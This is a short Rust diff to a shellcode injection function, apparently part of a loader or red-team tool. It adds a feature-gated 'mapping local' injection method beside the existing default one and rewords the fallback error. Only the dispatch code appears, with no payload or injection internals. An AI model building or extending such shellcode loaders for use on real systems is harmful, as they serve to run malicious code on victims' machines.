@@ -31,9 +31,15 @@ fn inject_shellcode(bytes_to_load: &[u8]) -> Result<*mut c_void, String> {
         inject_default_local(bytes_to_load).map_err(|e| format!("Injection failed: {}", e))
     }
     
-    #[cfg(not(any(feature = "InjectionDefaultLocal")))]
+    #[cfg(feature = "InjectionMappingLocal")]
     {
-        Err("Nomethod enabled".to_string())
+        use super::injection::inject_mapping_local;
+        inject_mapping_local(bytes_to_load)
+    }
+    
+    #[cfg(not(any(feature = "InjectionDefaultLocal", feature = "InjectionMappingLocal")))]
+    {
+        Err("No injection method enabled".to_string())
     }
 }
 
